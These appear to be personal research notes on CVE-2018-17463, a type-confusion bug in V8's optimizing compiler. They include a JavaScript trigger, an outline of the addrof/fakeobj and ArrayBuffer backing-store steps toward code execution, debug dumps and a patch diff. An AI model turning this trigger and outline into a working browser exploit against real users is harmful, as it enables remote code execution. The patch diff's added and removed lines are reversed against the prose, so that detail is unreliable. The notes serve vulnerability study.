## CVE-2018-17463

### Code audit: near the buggy source code:
> Side effects can be thought of change in the structure of the object while a builtin/ function gets excecuted.

```
#define CACHED_OP_LIST(V)                                            \
      ...                                                                \
      V(CreateObject, Operator::kNoWrite, 1, 1)                          \
      ...
```
- Assumes that there will be no potential side effects (kNoWrite: don't write to the effect chain).

#### Lowering:
- JSGenericLowering:
    - place where the lowering of the js code happens, LowerJSCreateObject is our vulnerable lowering method.
- OptimizeAsPrototype: control flow of the program reaches here in which the proto-type object may be modified during optimization.
- CreateObjectWithoutProperties: 
    - ``let properties: NameDictionary|SwissNameDictionary|EmptyFixedArray;`` sets the propety to a named dictionary.
    - handles switch case for the prototype(null, JSReciever, JSAny).
    - null: 
        - assign the map with a slow object with null prototype.
        - if `V8_ENABLE_SWISS_NAME_DICTIONARY` is enabled the properties will be set to a Named Dictionary.
    - JSReceiver:
        - properties will be a fixed_array.
        - assuming the map will be the original function's map. (no change).
    - JSAny:
        - do some stuff during the runtime. idc :D
- ObjectCreate:
    - calls ``GetObjectCreateMap``
        - calls ``OptimizeAsPrototype`` : this is the side effect function.
- OptimizeAsPrototype / TransitionToPrototype:
    - turns the given object as a prototype. 

#### Bug:
    - During the lowering the redundacy elimination will remove the checkmap speculation guard. But after the `OptimizeAsPrototype` the map indeed gets changed.
    - so we take advantage of this new map change. Which changed our propeties of out of line from a fixedArray to a NamedDictionary

#### Structure:
Base Idea:

```
    CheckHeapObject o
    CheckMap o, map1
    r0 = Load [o + 0x18]

    CheckHeapObject o
    CheckMap o, map1   <= will be removed 
    r1 = Load [o + 0x20]

    r2 = Add r0, r1
    CheckNoOverflow
    Return r2    
```

### Exploitation:

```
    function hax(o) {
        // Force a CheckMaps node.
        o.a;

        // Cause unexpected side-effects.
        Object.create(o);

        // Trigger type-confusion because CheckMaps node is removed.
        return o.b;
    }

    for (let i = 0; i < 100000; i++) {
        let o = {a: 42};
        o.b = 43;           // will be stored out-of-line.
        hax(o);
    }
```

- Since we know some pairs of overlap is there between fixedArray and NameDictionary, we use that to make the type feedback store some double and make it get a leak from another property.
- I wasted a lot of time in the step where you leak the address using the type confusion:
    - First of all, after a array is created and a property is modified weirdly the position in the memory changes. This happens when the property is not already there.
    - So Like the blog said a better method was to store all the property values in a seperate array and create the object using it.
- Now with type confusion you can construct addrof and fakeobj to get RCE.

- using the inline properties in prop1 and arraybuffer for p2 we can overwrite the backingstore of the ArrayBuffer.

#### Idea:

- Using addrof primitive get a object address.
- Change the backing store of Array buffer to get arb read/write.

### How the bug was patched:
    - Main reason the bug was there is because they assumed the objectCreate is not going to have any side effects so `kNoWrite` was the mode given for it. They changed it to `kNoProperties` which will make sure that it will have side effects.
```
-  V(CreateObject, Operator::kNoProperties, 1, 1)                         \
+  V(CreateObject, Operator::kNoWrite, 1, 1)                              \
```

### Additional Diff between before and after:

#### Before the optimize as prototype:
```
DebugPrint: 0x1c463820e241: [JS_OBJECT_TYPE]
 - map: 0x1f935468c9d1 <Map(HOLEY_ELEMENTS)> [FastProperties]
 - prototype: 0x0f1969e046d9 <Object map = 0x1f93546822f1>
 - elements: 0x1b80bc482cf1 <FixedArray[0]> [HOLEY_ELEMENTS]
 - properties: 0x1b80bc482cf1 <FixedArray[0]> {
    #x: 1337 (data field 0)
    #y: 1338 (data field 1)
 }
0x1f935468c9d1: [Map]
 - type: JS_OBJECT_TYPE
 - instance size: 40
 - inobject properties: 2
 - elements kind: HOLEY_ELEMENTS
 - unused property fields: 0
 - enum length: invalid
 - stable_map
 - back pointer: 0x1f935468c981 <Map(HOLEY_ELEMENTS)>
 - prototype_validity cell: 0x376181e82201 <Cell value= 1>
 - instance descriptors (own) #2: 0x1c463820e2a1 <DescriptorArray[8]>
 - layout descriptor: (nil)
 - prototype: 0x0f1969e046d9 <Object map = 0x1f93546822f1>
 - constructor: 0x0f1969e04711 <JSFunction Object (sfi = 0x376181e8f991)>
 - dependent code: 0x1b80bc482391 <Other heap object (WEAK_FIXED_ARRAY_TYPE)>
 - construction counter: 0
```

#### After the Optimize as prototype:
```
DebugPrint: 0x1c463820e241: [JS_OBJECT_TYPE]
 - map: 0x1f935468ca71 <Map(HOLEY_ELEMENTS)> [DictionaryProperties]
 - prototype: 0x0f1969e046d9 <Object map = 0x1f93546822f1>
 - elements: 0x1b80bc482cf1 <FixedArray[0]> [HOLEY_ELEMENTS]
 - properties: 0x1c463820e2f1 <NameDictionary[29]> {
   #x: 1337 (data, dict_index: 1, attrs: [WEC])
   #y: 1338 (data, dict_index: 2, attrs: [WEC])
 }
0x1f935468ca71: [Map]
 - type: JS_OBJECT_TYPE
 - instance size: 40
 - inobject properties: 2
 - elements kind: HOLEY_ELEMENTS
 - unused property fields: 0
 - enum length: invalid
 - dictionary_map
 - may_have_interesting_symbols
 - prototype_map
 - prototype info: 0x0f1969e234a9 <PrototypeInfo>
 - prototype_validity cell: 0x376181e82201 <Cell value= 1>
 - instance descriptors (own) #0: 0x1b80bc482321 <DescriptorArray[2]>
 - layout descriptor: (nil)
 - prototype: 0x0f1969e046d9 <Object map = 0x1f93546822f1>
 - constructor: 0x0f1969e04711 <JSFunction Object (sfi = 0x376181e8f991)>
 - dependent code: 0x1b80bc482391 <Other heap object (WEAK_FIXED_ARRAY_TYPE)>
 - construction counter: 0
```

- obervation: Objects are passed by reference and values are passed by value in js.

### Hash Table:

- hashing is based on randomness. First time seeing thing shit...
```
function GetObjectHash(key) {
  let hash = key[hashCodeSymbol];
  if (IS_UNDEFINED(hash)) {
    hash = (MathRandom() * 0x40000000) | 0;
    if (hash === 0) hash = 1;
    key[hashCodeSymbol] = hash;
  }
  return hash;
}
```
